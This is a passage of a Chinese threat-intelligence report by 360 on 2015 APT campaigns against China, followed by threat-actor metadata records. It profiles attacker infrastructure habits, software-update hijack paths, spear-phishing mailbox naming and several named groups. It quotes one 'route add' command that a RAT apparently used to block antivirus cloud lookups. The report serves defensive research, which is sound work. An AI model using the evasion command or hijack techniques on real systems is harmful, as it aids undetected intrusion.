办公软件的用户一般分布在国内政府机构或事业单位。\n\n另外针对特定行业或单位，会关注特定内容的文档，而不是所有的文档都关注。主要从\n文件名和文件扩展名两个方面来区分。如：只关注扩展名为“.doc”的文档，且文件名中包\n含“测试”字样的文档。\n\n3） 通信控制\n\n使用云盘存储窃取的数据信息，针对国内的云盘。攻击者通过使用国内某网盘官方提供\n的 API 进行文件上传。另外就是借助第三方博客进行恶意代码传播，这里主要是依托国内第\n三方某知名博客，攻击者首先会注册博客帐号，发表的每篇博客文章中会包含 shellcode 恶\n意代码，相关恶意代码是以博文形式存放。\n\n4） 域名注册偏好\n\n在本章“一、APT 生命周期的剖析：从武器构建到横向移动”中，我们介绍了攻击者在\n选择 C&C 域名的时候，更倾向采用动态域名，均采用境外动态域名服务商。但在注册具体\n\n26\n\n\n-----\n\n子域名的时候，更倾向采用具备中国元素的关键字，具体如下表所示：\n\n类别 名称\n\n模仿邮箱类 126mailserver、account163、mail163、163mailsends\n\n模仿杀毒软件类 safe360，rising\n\n模仿互联网公司类 360sc2、sohu、sogou、sina、baidu2\n\n表 14 部分注册名称列表\n\n## 二、 掌握目标作业环境\n\n1） 劫持主流应用\n\n主要针对目标环境中主流应用程序进行劫持。一般正常程序在更新和执行的过程中并不\n会有任何提示，更新过程一般不需要用户操作。另外我们还发现大量正常程序在更新的过程\n中，并不进行更新程序的签名校验、文件校验等检查，下载后便会直接执行。关于网络劫持\n攻击其他技术细节，在本报告“第四章 防御薄弱导致低成本入侵频频得手”中的“高成本\n的载荷投递：物理接触”章节中进行了详细描述，请参看具体章节。\n\n劫持的具体软件 相关文件路径\n\n劫持瑞星更新 C:\\Program Files (x86)\\Rising\\RSD\\Backup\\RSD\\RSSetup\\updater.exe\n\n劫持 **QQ 更新** %UserProfile%\\AppData\\Roaming\\Tencent\\QQ\\AuTemp\\XXXXXX\\NewUpd\\\ntxupd.exe\n\n劫持搜狗浏览器 %UserProfile%\\appdata\\roaming\\sogouexplorer\\seupdater.dll\n\n表 15 部分被劫持软件\n\n2） 压缩包\n\n在鱼叉式邮件攻击、水坑式攻击、基于即时通讯工具攻击等方式中，恶意代码一般都首\n先会进行压缩，以压缩包的形态传输。在针对国内的 APT 攻击中，我们发现大多数压缩包\n格式为 RAR，其余主要是 ZIP（具体参看下图）。在国内压缩包软件中 WinRAR 还是占据主流。\n\n图 22 APT 组织压缩包使用情况\n\n27\n\n|类别|名称|\n|---|---|\n|模仿邮箱类|126mailserver、account163、mail163、163mailsends|\n|模仿杀毒软件类|safe360，rising|\n|模仿互联网公司类|360sc2、sohu、sogou、sina、baidu2|\n\n|劫持的具体软件|相关文件路径|\n|---|---|\n|劫持瑞星更新|C:\\Program Files (x86)\\Rising\\RSD\\Backup\\RSD\\RSSetup\\updater.exe|\n|劫持QQ 更新|%UserProfile%\\AppData\\Roaming\\Tencent\\QQ\\AuTemp\\XXXXXX\\NewUpd\\ txupd.exe|\n|劫持搜狗浏览器|%UserProfile%\\appdata\\roaming\\sogouexplorer\\seupdater.dll|\n\n\n-----\n\n3） 隐匿对抗\n\nAPT 攻击中的 RAT 采用了大量对抗手法，其中针对国内的安全软件主要包括：360 卫士、\n360 杀毒、瑞星杀毒、金山毒霸、金山卫士、QQ 软件管家、东方微点等。\n\n在对抗的过程中如果发现杀毒软件，恶意代码会选择放弃执行后续的功能代码，或者会\n选择绕过杀毒软件的检测。其中在 APT-C-00 的攻击中利用了一个 0day 溢出漏洞来躲避杀毒\n软件的检测，APT-C-06 的 RAT 在针对 360 安全软件的时候，通过添加静态路由的方式，疑似\n屏蔽 360 云查杀检测。如下表内具体操作：\n\n\nroute add 220.x.x.x mask 255.255.255.0 192.168.1.254 && route add 220.x.x.x mask\n255.255.255.0 192.168.1.254\n\n\n另外大多数 RAT 会伪装 360、QQ 等国内主流应用路径或版本信息。\n\n# 三、 符合目标习惯偏好\n\n1） 定时攻击\n\nAPT 组织在对目标进行大量研究分析后，制定了具体发动攻击行动的时间安排，主要从\n目标用户作息时间、行业相关重大会议和国内大型节日等时间，另外水坑攻击更加严谨，在\n完成攻击后会将篡改的内容删除或恢复。具体内容我们在“第五章攻击手法的不断演进与蜕\n变”中进行了详细介绍。\n\n2） 邮件服务商\n\n初始攻击环节，发送鱼叉邮件是该环节最后的步骤，我们发现相关组织主要倾向使用网\n易、新浪等国内第三方邮箱，其中以网易邮箱为主，进一步包括：163、126 和 yeah 邮箱。\n注册的用户名与针对的目标和伪装的发件人身份是有较强对应关系，如 APT-C-05 组织发动\n的攻击行动中，以某会议举办方名义给相应行业专家发送攻击邮件时，邮箱注册的用户名采\n用相关会议官方网站主域名；另外伪装某政府人员，采用的用户名是相应人员姓名的拼音全\n拼，如果用户名被注册（如：zhangsan）则会在全拼后追加部分数字内容（如：zhangsan123）。\n\n28\n\n\n-----\n\n# 第六章 针对中国APT 攻击的趋势预测\n\n## 一、 APT 组织的攻击目标\n\n（一） 紧密围绕政治、经济、科技、军工等热点领域及事件\n\nAPT 组织将会持续以经济、政治、科技等热点相关的行业或机构为攻击目标，如十三\n五规划、一带一路、军工制造等相关领域。中华人民共和国国民经济和社会发展第十三个五\n年规划纲要，简称“十三五”规划（2016－2020 年），主要阐明国家战略意图，明确政府工\n作重点，引导市场主体行为，是 2016－2020 年中国经济社会发展的宏伟蓝图。国家的发展\n规划和战略意图一直以来都是 APT 组织关注的重点领域，稳步推进“一带一路”建设合作\n是中国“十三五”规划的重要内容，在 11 月、12 月期间我们已经捕获到针对相关目标的攻\n击行动，相关攻击行动主要以“一带一路”、“21 世纪海上丝绸之路”等诱饵信息攻击相关\n领域的目标群体。\n\n（二） 由商业竞争产生的APT 攻击将不断增加\n\nAPT 组织多数具备国家背景，以探测目标国家战略意图为主。但我们发现某些无国家背\n景，主要以牟利为目的的境内外黑客组织开始利用 APT 攻击手法的攻击逐渐出现。在 2015\n年 4 月份，我们捕获到一个针对中国外贸行业的境外黑客组织，该组织利用 APT 初始攻击\n中常用的鱼叉式邮件发起攻击，携带附件有 PE 二进制木马、漏洞文档等，而且攻击者在发\n送邮件之后还通过多次回复的形式与目标用户进行交互，通过持续跟踪分析我们初步判定该\n黑客组织主要是以欺诈货款为目的。\n\n我们推测未来由商业竞争产生的以 APT 攻击手法，针对商业领域的攻击将会频繁出现。\n\n（三） 针对非Windows 的攻击频率持续增高\n\n在 2015 年针对中国的 APT 攻击中，我们可以看到针对 Android、Mac OS X 等非 Windows\n系统的攻击逐渐出现。Windows 不在是 APT 攻击的主战场，相关攻击会从只针对 Windows\n操作系统逐步过渡到针对如 Linux、Android、Mac OS X 和工业控制系统相关攻击出现的频率\n和次数将会持续增高。另外攻击的目标不再局限于敏感数据窃取，而如同震网（Stuxnet）\n蠕虫以破坏系统导致瘫痪为目的的 APT 攻击将不断浮出水面。\n\n## 二、 APT 组织的攻击手法\n\n（一） APT 攻击越来越难被“看见”\n\n在 2015 年 RAT 的发展趋势中，我们提到 RAT 文件格式整体趋势是从 PE 到非 PE 转变，\n文件形态也由实体文件逐步转化为无实体文件。从功能形态而言，从早期的单个文件聚合多\n种功能逐渐演变为功能单一的主、子模块间互相调用的模式。而恶意代码最终寄宿的位置也\n从常见的系统目录逐渐进入到更加难以追踪的 MBR、VBR、磁盘固件、EFI、BIOS 乃至于移\n动存储设备中的隐藏分区中。其中方程式组织（Equation Group）将恶意代码写入到磁盘固\n件中，导致除了磁盘生产商外，没有任何安全厂商可以实现检测及恶意代码提取。\n\n除了 RAT 以外，如：初始攻击方式逐步发展为周期性攻击、事后恢复；C&C 域名大量采\n用动态域名，非动态域名采用域名 WHOIS 信息保护，进一步依托可信网站、SNS、第三方云\n\n29\n\n\n-----\n\n盘等传输指令、文件等这些手法都让防御设备和安全分析人员很难定位追踪。\n\n（二） 对安全厂商从被动隐匿到主动出击\n\n在 APT 攻击行动中从初始攻击到横向移动，各个环节都存在大量对抗手法，其目的是\n保证攻击成功且不留痕迹。在具体的攻击中遇到防御措施，攻击者一般会选择放弃、等待、\n绕过或主动突破等方法，而这些基本都是针对具体目标环境中部署的防御措施。\n\n然而 2015 年我们发现的 APT-C-00 组织将木马构造伪装为 Acunetix Web Vulnerability\nScanner（WVS）7 的破解版，进一步我们推测针对的目标很有可能是网络安全从业人员、研\n究人员或者其他黑客组织。另外针对卡巴基斯攻击的 duqu2.0 曝光，以及卡巴斯基在对 2016\n年安全趋势的预测报告[17]中也提出“针对安全厂商的攻击”，从各方面都可以看出 APT 组织\n针对安全行业将会从被动隐匿过渡到主动出击。\n\n## 三、 反APT 领域的发展\n\n（一） 更多针对中国的APT 攻击将曝光\n\n360 在 2015 年 5 月末发布了海莲花（OceanLotus）APT 组织，这也是中国安全厂商首次\n曝光针对中国攻击的境外 APT 攻击组织。中国在反 APT 的相关研究还是起步阶段，针对我\n国的 APT 攻击更是鲜为人知，而随着中央网络安全和信息化领导小组的成立，以及习近平\n主席在中美互联网论坛强调“中国倡导建设和平、安全、开放、合作的网络空间”，我们相\n信针对中国的 APT 攻击将越来越多的被曝光。\n\n（二） 反APT 领域的防守协作持续增强\n\n随着 APT、网络间谍等越来越引起政府、企业的关注和重视，国外的威胁情报共享迅速\n发展，期间形成如 IOC（Indicators of Compromise，威胁指标）、STIX（Structured Threat\nInformation Expression）等标准。\n\n在国内政府机构、目标行业和安全厂商三者如何协作，在国际上我们如何与境外机构厂\n商建立良好的沟通和合作方式则是重点。在对抗 APT 等新威胁，360 一直坚持开放、合作的\n态度，愿意与中国及国际安全厂商在威胁情报共享以及 APT 监测与响应方面形成协作。2015\n年末，360 威胁情报中心（https://ti.360.com）正式发布，也是在威胁情报共享方面做出的\n实质性动作。\n\n17“Kaspersky Security Bulletin. 2016 Predictions”，\nhttps://securelist.com/analysis/kaspersky-security-bulletin/72771/kaspersky-security-bulletin-2016-predictions/\n\n30\n\n\n-----\n\n# 第七章 本报告涉及的部分APT 组织\n\n本研究报告中涉及到了 4 个 APT 组织或攻击行动，除了 APT-C-00 部分内容已经解密，\n其他相关组织的攻击行为和手法也会逐步在 2016 年通过特定报告的方式进行解密。\n\n除此之外，我们还掌握了其他数十个 APT 组织，由于涉及到较多的敏感信息，会在后\n期逐步进行解密。\n\n## 一、 APT-C-00 组织\n\nAPT-C-00 组织是我们 2015 年 5 月发布的针对中国攻击的某著名境外 APT 组织，该组织\n主要针对中国政府、科研院所和海事机构等重要领域发起攻击。基于海量情报数据和研究分\n析，我们还原了 APT-C-00 组织的完整攻击行动，相关攻击行动最早可以追溯到 2011 年，期\n间不仅针对中国，同时还针对其他国家发起攻击。该组织大量使用水坑式攻击和鱼叉式钓鱼\n邮件攻击，攻击不限于 Windows 系统，还针对其他非 Windows 操作系统，相关攻击至今还\n非常活跃。\n\n## 二、 APT-C-05 组织\n\nAPT-C-05 组织是只针对中国攻击的境外 APT 组织，主要对中国政府、军事、科技和教\n育等重点单位和部门进行了持续 8 年的网络间谍活动，相关攻击行动最早可以追溯到 2007\n年。期间我们先后捕获到了 13 种不同的后门程序，涉及样本数量上百个。该组织在初始攻\n击环节主要采用鱼叉式钓鱼邮件攻击，进一步使用了大量已知漏洞和 0day 漏洞发起攻击，\n这些木马的感染者遍布国内 31 个省级行政区。\n\n## 三、 APT-C-06 组织\n\nAPT-C-06 组织是境外 APT 组织，其主要目标除了中国，还有其他国家。该组织主要针\n对政府领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到 2007 年。\n该组织利用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过 200\n个。另外该组织发动初始攻击的方式并非传统的鱼叉式和水坑式攻击等常见手法，而是另一\n种特殊的攻击方法。\n\n## 四、 APT-C-12 组织\n\nAPT-C-12 组织是境外 APT 组织，主要对中国军事、政府、工业等领域发起攻击。相关\n攻击行动最早可以追溯到 2011 年，我们捕获到的恶意代码数量超过 600 个。相关攻击行动\n至今还非常活跃，我们监控到近期该组织进行了大量横向移动攻击，相关横向移动恶意代码\n从功能区分至少有 6 种。该组织针对的具体目标分布在中国数十个省级行政区，其中北京、\n上海、海南是重灾区。\n\n31\n\n\n-----\n\n# 360 威胁情报中心\n\n360 威胁情报中心由全球最大的互联网安全公司奇虎 360 特别成立，是中国首个面向企\n业和机构的互联网威胁情报整合专业机构。该中心以业界领先的安全大数据资源为基础，基\n于 360 长期积累的核心安全技术，依托亚太地区顶级的安全人才团队，通过强大的大数据能\n力，实现全网威胁情报的即时、全面、深入的整合与分析，为企业和机构提供安全管理与防\n护的网络威胁预警与情报。\n\n# 360 天眼实验室（SkyEye Labs）\n\n天眼实验室（SkyEye Labs）正式成立于 2014 年 1 月，是 360 公司旗下专门利用大数据\n技术研究未知威胁的技术团队。该实验室依托 360 公司多年来积累的海量多维度安全大数据\n和数据挖掘技术，实现对全网未知威胁的发现、溯源、监测和预警，及时准确地为客户提供\n安全检测和防护设备所需要的威胁情报。\n\n# 360 追日团队（Helios Team）\n\n360 追日团队（Helios Team）是 360 公司高级威胁研究团队，从事 APT 攻击发现与追踪、\n互联网安全事件应急响应、黑客产业链挖掘和研究等工作。团队成立于 2014 年 12 月，在短\n短的一年时间内整合 360 公司海量安全数据，实现了威胁情报快速关联溯源，首次发现并追\n踪数十个 APT 组织及黑客产业链，扩大了黑客产业研究视野，填补了国内 APT 研究的空白，\n并为大量企业和政府机构提供安全威胁评估及解决方案输出。\n\n32\n\n\n-----",
    "language": "ZH",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.01.19.360_APT_Report/%5BCN%5D_2015.APT.Annual_Report.pdf"
    ],
    "report_names": [
        "[CN]_2015.APT.Annual_Report"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1dadf04e-d725-426f-9f6c-08c5be7da159",
            "created_at": "2022-10-25T15:50:23.624538Z",
            "updated_at": "2025-03-27T02:00:55.508759Z",
            "deleted_at": null,
            "main_name": "Darkhotel",
            "aliases": [
                "Darkhotel",
                "DUBNIUM",
                "Zigzag Hail"
            ],
            "source_name": "MITRE:Darkhotel",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5d9dfc61-6138-497a-b9da-33885539f19c",
            "created_at": "2022-10-25T16:07:23.720008Z",
            "updated_at": "2025-03-27T02:02:09.944484Z",
            "deleted_at": null,
            "main_name": "Icefog",
            "aliases": [
                "ATK 23",
                "Dagger Panda",
                "Icefog",
                "Red Wendigo"
            ],
            "source_name": "ETDA:Icefog",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Dagger Three",
                "Fucobha",
                "Icefog",
                "Javafog",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1aead86d-0c57-4e3b-b464-a69f6de20cde",
            "created_at": "2023-01-06T13:46:38.318176Z",
            "updated_at": "2025-03-27T02:00:02.803684Z",
            "deleted_at": null,
            "main_name": "DAGGER PANDA",
            "aliases": [
                "IceFog",
                "RedFoxtrot",
                "Red Wendigo",
                "PLA Unit 69010"
            ],
            "source_name": "MISPGALAXY:DAGGER PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9ff60d4d-153b-4ed5-a2f7-18a21d2fa05d",
            "created_at": "2022-10-25T16:07:23.539852Z",
            "updated_at": "2025-03-27T02:02:09.853285Z",
            "deleted_at": null,
            "main_name": "Desert Falcons",
            "aliases": [
                "APT-C-23",
                "ATK 66",
                "Arid Viper",
                "Operation Arid Viper",
                "Operation Bearded Barbie",
                "Operation Rebound",
                "TAG-63",
                "TAG-CT1",
                "Two-tailed Scorpion"
            ],
            "source_name": "ETDA:Desert Falcons",
            "tools": [
                "AridSpy",
                "Barb(ie) Downloader",
                "BarbWire",
                "Desert Scorpion",
                "FrozenCell",
                "GlanceLove",
                "GnatSpy",
                "KasperAgent",
                "Micropsia",
                "PyMICROPSIA",
                "SpyC23",
                "Viper RAT",
                "ViperRAT",
                "VolatileVenom",
                "WinkChat",
                "android.micropsia"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b13c19d6-247d-47ba-86ba-15a94accc179",
            "created_at": "2024-05-01T02:03:08.149923Z",
            "updated_at": "2025-03-27T02:05:17.422065Z",
            "deleted_at": null,
            "main_name": "TUNGSTEN BRIDGE",
            "aliases": [
                "DUBNIUM ",
                "DarkHotel ",
                "CTG-1948 "
            ],
            "source_name": "Secureworks:TUNGSTEN BRIDGE",
            "tools": [
                "Nemim"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
            "created_at": "2023-01-06T13:46:38.272109Z",
            "updated_at": "2025-03-27T02:00:02.790029Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "DUBNIUM",
                "Fallout Team",
                "Luder",
                "Tapaoux",
                "Shadow Crane",
                "APT-C-06",
                "SIG25",
                "Karba",
                "Nemim",
                "Nemin",
                "G0012",
                "ATK52",
                "T-APT-02",
                "TUNGSTEN BRIDGE",
                "Zigzag Hail"
            ],
            "source_name": "MISPGALAXY:DarkHotel",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b1979c55-037a-415f-b0a3-cab7933f5cd4",
            "created_at": "2024-04-24T02:00:49.561432Z",
            "updated_at": "2025-03-27T02:00:55.493381Z",
            "deleted_at": null,
            "main_name": "APT-C-23",
            "aliases": [
                "APT-C-23",
                "Arid Viper",
                "Desert Falcon",
                "TAG-63",
                "Grey Karkadann",
                "Big Bang APT",
                "Two-tailed Scorpion"
            ],
            "source_name": "MITRE:APT-C-23",
            "tools": [
                "Micropsia"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "77c08a4a-b3f9-43ee-9d84-04ba572b7564",
            "created_at": "2024-05-01T02:03:07.927023Z",
            "updated_at": "2025-03-27T02:05:17.248836Z",
            "deleted_at": null,
            "main_name": "ALUMINUM SHADYSIDE",
            "aliases": [
                "Arid Viper ",
                "Desert Falcon ",
                "APT-C-23 "
            ],
            "source_name": "Secureworks:ALUMINUM SHADYSIDE",
            "tools": [
                " SpyC23",
                "Micropsia"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
